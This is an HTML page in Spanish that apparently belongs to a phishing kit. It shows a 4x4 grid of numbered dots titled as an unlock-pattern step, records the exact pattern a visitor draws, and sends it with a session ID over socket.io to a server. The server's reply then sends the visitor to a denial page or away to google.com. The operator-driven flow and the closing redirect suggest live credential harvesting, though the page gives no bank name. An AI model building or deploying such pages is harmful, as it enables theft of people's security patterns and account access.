<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Patrón de Desbloqueo</title>
  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&display=swap" rel="stylesheet">
  <style>
    body {
      margin: 0;
      font-family: 'Open Sans', sans-serif;
      background: #f3f6f9;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
    }

    .screen {
      display: flex;
      flex-direction: column;
      align-items: center;
      background: #fff;
      padding: 2rem;
      border-radius: 1rem;
      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.1);
      width: 90%;
      max-width: 400px;
      text-align: center;
    }

    .pattern-container {
      position: relative;
      width: 300px;
      height: 300px;
      display: grid;
      grid-template-columns: repeat(4, 1fr);
      grid-template-rows: repeat(4, 1fr);
      gap: 25px;
      margin: 2rem 0;
      touch-action: none;
    }

    canvas {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      pointer-events: none;
    }

    .dot {
      width: 50px;
      height: 50px;
      border: 3px solid #ccc;
      border-radius: 50%;
      background: white;
      margin: auto;
      display: flex;
      align-items: center;
      justify-content: center;
      font-weight: bold;
      font-size: 1rem;
      color: #555;
      z-index: 2;
      transition: background 0.2s, border-color 0.2s, color 0.2s;
    }

    .dot.active {
      background: #1B4D08;
      border-color: #1B4D08;
      color: white;
    }

    button {
      background: #1B4D08;
      color: white;
      padding: 0.75rem 2rem;
      border: none;
      border-radius: 50px;
      font-weight: 600;
      cursor: pointer;
      margin-top: 1rem;
      transition: background 0.3s;
    }

    button:hover {
      background: #000000;
    }

    .mensaje-error {
      color: red;
      margin-top: 0.5rem;
      font-size: 0.85rem;
    }
  </style>
</head>
<body>
  <div class="screen">
    <h3>Dibuja tu patrón</h3>
    <p>Los puntos están numerados para que identifiques tu patrón.</p>

    <div class="pattern-container" id="patternContainer">
      <canvas id="patternCanvas"></canvas>
    </div>

    <p id="mensajeError" class="mensaje-error"></p>
    <button onclick="enviarPatron()">Validar patrón</button>
  </div>

  <script src="/socket.io/socket.io.js"></script>
  <script>
    const socket = io();
    const sessionId = localStorage.getItem("sessionId");
    socket.emit("reconectar", sessionId);

    const container = document.getElementById("patternContainer");
    const canvas = document.getElementById("patternCanvas");
    const ctx = canvas.getContext("2d");
    const mensajeError = document.getElementById("mensajeError");

    let dots = [];
    let pattern = [];
    let isDrawing = false;

    // Ajustar canvas
    canvas.width = container.clientWidth;
    canvas.height = container.clientHeight;

    // Crear 16 puntos numerados
    for (let i = 1; i <= 16; i++) {
      const dot = document.createElement("div");
      dot.classList.add("dot");
      dot.dataset.id = i;
      dot.textContent = i; // <-- EL NÚMERO GUÍA VISIBLE
      container.appendChild(dot);
      dots.push(dot);
    }

    function getDotCenter(dot) {
      const rect = dot.getBoundingClientRect();
      const containerRect = container.getBoundingClientRect();
      return {
        x: rect.left - containerRect.left + rect.width / 2,
        y: rect.top - containerRect.top + rect.height / 2,
      };
    }

    function startDrawing(e) {
      e.preventDefault();
      isDrawing = true;
      pattern = [];
      ctx.clearRect(0, 0, canvas.width, canvas.height);
      dots.forEach(d => d.classList.remove("active"));
    }

    function draw(e) {
      if (!isDrawing) return;
      const x = (e.touches ? e.touches[0].clientX : e.clientX) - container.getBoundingClientRect().left;
      const y = (e.touches ? e.touches[0].clientY : e.clientY) - container.getBoundingClientRect().top;

      dots.forEach(dot => {
        const rect = dot.getBoundingClientRect();
        if (
          x > rect.left - container.getBoundingClientRect().left &&
          x < rect.right - container.getBoundingClientRect().left &&
          y > rect.top - container.getBoundingClientRect().top &&
          y < rect.bottom - container.getBoundingClientRect().top
        ) {
          if (!pattern.includes(dot.dataset.id)) {
            pattern.push(dot.dataset.id);
            dot.classList.add("active");
          }
        }
      });

      redrawLines();
    }

    function stopDrawing() {
      isDrawing = false;
    }

    function redrawLines() {
      ctx.clearRect(0, 0, canvas.width, canvas.height);
      if (pattern.length < 2) return;
      ctx.beginPath();
      ctx.lineWidth = 4;
      ctx.strokeStyle = "#1B4D08";

      pattern.forEach((id, index) => {
        const dot = dots[id - 1];
        const { x, y } = getDotCenter(dot);
        if (index === 0) ctx.moveTo(x, y);
        else ctx.lineTo(x, y);
      });

      ctx.stroke();
    }

    function enviarPatron() {
      mensajeError.textContent = "";
      if (pattern.length === 0) {
        mensajeError.textContent = "Debes dibujar un patrón";
        return;
      }

      // Aquí enviamos el orden exacto de IDs
      socket.emit("patronIngresado", { patron: pattern, sessionId });

      // Ir a la pantalla siguiente
      window.location.href = "opciones.html";
    }

    // Eventos
    container.addEventListener("mousedown", startDrawing);
    container.addEventListener("touchstart", startDrawing, { passive: false });

    container.addEventListener("mousemove", draw);
    container.addEventListener("touchmove", draw, { passive: false });

    window.addEventListener("mouseup", stopDrawing);
    window.addEventListener("touchend", stopDrawing);

    socket.on("respuestaPatron", (decision) => {
      if (decision === "error") {
        window.location.href = "denegado.html";
      } else if (decision === "finalizar") {
        window.location.href = "https://www.google.com";
      }
    });
  </script>
</body>
</html>
